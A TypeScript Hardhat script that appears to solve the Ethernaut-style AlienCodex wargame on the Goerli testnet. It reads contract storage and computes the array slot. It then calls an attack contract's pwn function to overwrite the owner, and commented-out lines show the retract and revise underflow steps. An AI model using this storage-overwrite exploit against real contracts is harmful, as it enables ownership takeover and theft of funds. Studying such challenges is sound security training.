import { BigNumberish } from "ethers"
import { ethers } from "hardhat"

const provider = new ethers.providers.JsonRpcProvider(
  process.env.GOERLI_RPC_URL
)

const increaseHexByOne = (hex: string) => {
  let x = ethers.BigNumber.from(hex)
  let plusOne = x.add(1)
  return plusOne.toHexString()
}

const main = async () => {
  const [deployer, user1] = await ethers.getSigners()
  const targetAddress = "0xAEb2D3681F3B1F0D19281F76320B8AC7eEbf5A7f"
  const targetAbi = [
    {
      constant: false,
      inputs: [
        {
          name: "i",
          type: "uint256",
        },
        {
          name: "_content",
          type: "bytes32",
        },
      ],
      name: "revise",
      outputs: [],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
      signature: "0x0339f300",
    },
    {
      constant: true,
      inputs: [],
      name: "contact",
      outputs: [
        {
          name: "",
          type: "bool",
        },
      ],
      payable: false,
      stateMutability: "view",
      type: "function",
      signature: "0x33a8c45a",
    },
    {
      constant: false,
      inputs: [],
      name: "retract",
      outputs: [],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
      signature: "0x47f57b32",
    },
    {
      constant: false,
      inputs: [],
      name: "make_contact",
      outputs: [],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
      signature: "0x58699c55",
    },
    {
      constant: false,
      inputs: [],
      name: "renounceOwnership",
      outputs: [],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
      signature: "0x715018a6",
    },
    {
      constant: true,
      inputs: [],
      name: "owner",
      outputs: [
        {
          name: "",
          type: "address",
        },
      ],
      payable: false,
      stateMutability: "view",
      type: "function",
      signature: "0x8da5cb5b",
    },
    {
      constant: true,
      inputs: [],
      name: "isOwner",
      outputs: [
        {
          name: "",
          type: "bool",
        },
      ],
      payable: false,
      stateMutability: "view",
      type: "function",
      signature: "0x8f32d59b",
    },
    {
      constant: true,
      inputs: [
        {
          name: "",
          type: "uint256",
        },
      ],
      name: "codex",
      outputs: [
        {
          name: "",
          type: "bytes32",
        },
      ],
      payable: false,
      stateMutability: "view",
      type: "function",
      signature: "0x94bd7569",
    },
    {
      constant: false,
      inputs: [
        {
          name: "_content",
          type: "bytes32",
        },
      ],
      name: "record",
      outputs: [],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
      signature: "0xb5c645bd",
    },
    {
      constant: false,
      inputs: [
        {
          name: "newOwner",
          type: "address",
        },
      ],
      name: "transferOwnership",
      outputs: [],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
      signature: "0xf2fde38b",
    },
    {
      anonymous: false,
      inputs: [
        {
          indexed: true,
          name: "previousOwner",
          type: "address",
        },
        {
          indexed: true,
          name: "newOwner",
          type: "address",
        },
      ],
      name: "OwnershipTransferred",
      type: "event",
      signature:
        "0x8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0",
    },
  ]

  const target = await ethers.getContractAt(targetAbi, targetAddress)
  const contract = await ethers.getContract("AlienCodex")

  console.log("contact", await target.contact())
  console.log("owner", await target.owner())
  // // read storage
  for (let index = 0; index < 3; index++) {
    console.log(await provider.getStorageAt(targetAddress, index))
  }

  // get array value
  let storageNumberHash = ethers.utils.keccak256(
    "0x0000000000000000000000000000000000000000000000000000000000000001"
  )

  // 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6
  console.log(
    `array value ${storageNumberHash}`,
    await provider.getStorageAt(targetAddress, storageNumberHash)
  )

  storageNumberHash = increaseHexByOne(storageNumberHash)

  console.log(
    `array value ${storageNumberHash}`,
    await provider.getStorageAt(targetAddress, storageNumberHash)
  )

  const tx = await contract.pwn(targetAddress, deployer.address, {
    gasLimit: 100000,
  })
  // const tx = await target.transferOwnership(deployer.address, {
  //   gasLimit: 100000,
  // })

  // const tx = await target.retract({ gasLimit: 100000 })

  // const bytesToSend = `0x000000000000000000000000${deployer.address.slice(2)}`
  // const tx = await target.revise(1, bytesToSend, { gasLimit: 100000 })

  try {
    const receipt = await tx.wait()
    console.log(
      `tx at https://goerli.etherscan.io/tx/${receipt.transactionHash}`
    )
  } catch (error: any) {
    console.error("Error:", error.reason)
    console.log(
      `Error tx  at https://goerli.etherscan.io/tx/${error?.transactionHash}`
    )
  }

  console.log("contact", await target.contact())
  console.log("owner", await target.owner())
  // // read storage
  for (let index = 0; index < 3; index++) {
    console.log(await provider.getStorageAt(targetAddress, index))
  }

  // get array value
  storageNumberHash = ethers.utils.keccak256(
    "0x0000000000000000000000000000000000000000000000000000000000000001"
  )

  // 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6
  console.log(
    `array value ${storageNumberHash}`,
    await provider.getStorageAt(targetAddress, storageNumberHash)
  )

  storageNumberHash = increaseHexByOne(storageNumberHash)

  console.log(
    `array value ${storageNumberHash}`,
    await provider.getStorageAt(targetAddress, storageNumberHash)
  )
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
